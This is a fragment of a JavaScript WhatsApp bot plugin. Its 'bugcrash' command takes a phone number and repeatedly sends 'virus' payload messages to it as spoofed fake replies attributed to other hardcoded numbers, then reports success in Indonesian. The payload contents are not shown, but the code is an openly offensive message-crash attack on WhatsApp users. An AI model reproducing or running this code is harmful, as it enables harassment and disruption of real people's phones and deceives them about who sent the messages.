...
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	...
	switch (type) {
		...
		break
		case 'bugcrash': {
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '15517868074@s.whatsapp.net', `${virus2}`, '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '447710173736@s.whatsapp.net', `${virus2}`, '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '447710173736@s.whatsapp.net', `${virus2}`, '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '622150996855@s.whatsapp.net', `${virus2}`, '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '622150996855@s.whatsapp.net', `${virus2}`, '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '15517868074@s.whatsapp.net', `${virus2}`, '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '15517868074@s.whatsapp.net', `${virus2}`, '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '447710173736@s.whatsapp.net', `${virus2}`, '0@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${virus}`, '447710173736@s.whatsapp.net', `${virus2}`, '0@s.whatsapp.net@broadcast')
			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
	...
	m.reply(`Berhasil Mengirim ${text}`)
}
